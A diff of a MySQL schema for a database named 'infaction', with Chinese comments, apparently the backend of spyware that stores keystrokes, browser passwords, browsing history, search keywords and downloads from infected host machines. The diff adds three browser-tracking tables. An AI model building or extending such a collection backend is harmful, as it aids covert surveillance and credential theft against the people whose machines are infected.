@@ -2,7 +2,7 @@ DROP database infaction;
 CREATE DATABASE `infaction` character set utf8  /*!40100 DEFAULT CHARACTER SET utf8 */;
 USE `infaction`;
 CREATE TABLE IF NOT EXISTS `machine` (
-  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
+  `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
   `user` varchar(30) NOT NULL COMMENT '系统用户',
   `version` varchar(40) NOT NULL COMMENT '系统版本',
   `version_info` varchar(20) NOT NULL COMMENT '系统信息',
@@ -24,7 +24,7 @@ CREATE TABLE IF NOT EXISTS `machine` (
 ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
 --联合主键需要一起作为外键
 CREATE TABLE IF NOT EXISTS `keyboard` (
-  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
+  `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
   `hit` text NOT NULL COMMENT '敲击记录',
   `hostid` varchar (50) not null COMMENT '主机ID' ,
   `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
@@ -33,7 +33,7 @@ CREATE TABLE IF NOT EXISTS `keyboard` (
 ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
 
 CREATE TABLE IF NOT EXISTS `browser` (
-  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
+  `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
   `website` text NOT NULL COMMENT '浏览网址',
   `user`  varchar(30)  not null COMMENT '账号' ,
   `password` varchar(50)  not null COMMENT '密码' ,
@@ -41,6 +41,36 @@ CREATE TABLE IF NOT EXISTS `browser` (
   `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
   PRIMARY KEY (`id`),
   constraint user_browser_id foreign key(hostid) references machine(hostid)
+) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
+
+CREATE TABLE IF NOT EXISTS `browser_url` (
+  `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
+  `website` text NOT NULL COMMENT '浏览网址',
+  `title`  varchar(255)  not null COMMENT '标题' ,
+  `visit` int(10)  not null COMMENT '查看次数' ,
+  `hostid` varchar(50) not null COMMENT '主机ID' ,
+  `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
+  PRIMARY KEY (`id`),
+  constraint browser_url_id foreign key(hostid) references machine(hostid)
+) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
+
+CREATE TABLE IF NOT EXISTS `browser_keyword` (
+  `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
+  `keyword` varchar(500) NOT NULL COMMENT '查询关键字',
+  `hostid` varchar(50) not null COMMENT '主机ID' ,
+  `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
+  PRIMARY KEY (`id`),
+  constraint browser_keyword_id foreign key(hostid) references machine(hostid)
+) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
+
+CREATE TABLE IF NOT EXISTS `browser_download` (
+  `id` int(20) NOT NULL AUTO_INCREMENT COMMENT '唯一索引id',
+  `url` varchar(500) NOT NULL COMMENT '下载地址',
+  `hostid` varchar(50) not null COMMENT '主机ID' ,
+  `path` varchar(255) not null COMMENT '下载到本地的路径' ,
+  `createTime` TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '插入时间',
+  PRIMARY KEY (`id`),
+  constraint browser_download_id foreign key(hostid) references machine(hostid)
 ) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
 
 DROP TABLE IF EXISTS `qrtz_job_details`;
